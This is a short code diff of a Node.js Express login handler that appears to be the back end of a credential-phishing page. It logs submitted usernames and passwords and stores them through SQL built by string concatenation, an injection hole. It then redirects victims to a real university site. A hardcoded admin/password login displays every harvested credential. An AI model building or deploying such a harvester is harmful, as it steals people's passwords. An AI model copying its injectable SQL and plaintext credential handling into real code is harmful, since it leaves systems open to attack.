@@ -25,11 +25,9 @@ app.post('/login', function(req, res) {
 	console.log(req.body.username)
 	console.log(req.body.password)
 	if (req.body.username == 'admin' && req.body.password == 'password') {
-		loginList = [
-			{ username: 'kian', password: 'llamalover99' },
-			{ username: 'yana', password: 'catfan666' },
-		]
-		res.render('admin.ejs', { logins: loginList })
+		db.all("select * from micadata;", function(err, all) {
+			res.render('admin.ejs', { logins: all })
+		})
 	} else {
 		db.run("insert into micadata (username, password) values ('" + req.body.username + "', '" + req.body.password + "');")
 		res.redirect('https://mica.edu')
